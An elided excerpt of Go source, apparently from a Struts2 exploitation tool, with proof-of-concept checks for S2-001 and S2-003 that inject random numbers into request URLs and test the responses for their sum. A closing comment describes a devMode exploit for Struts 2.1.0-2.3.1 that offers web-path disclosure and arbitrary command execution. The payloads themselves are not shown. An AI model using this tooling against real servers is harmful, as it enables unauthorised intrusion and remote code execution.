...
var client = req.C().
	SetUserAgent(utils.GlobalUserAgent).
...
func (c *WorkExp) PocS001() {
	...
	if resp != nil {
		if strings.Contains(resp.String(), strconv.Itoa(r1+r2)) {
...
func (c *WorkExp) PocS003() {
	...
	reqUrl = strings.Replace(reqUrl, "{{r1}}", strconv.Itoa(r1), -1)
	reqUrl = strings.Replace(reqUrl, "{{r2}}", strconv.Itoa(r2), -1)
	resp, err := client.R().
		Get(reqUrl)
	if err != nil {
...
// PocDevMode S2-devMode:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持获取WEB路径,任意命令执行
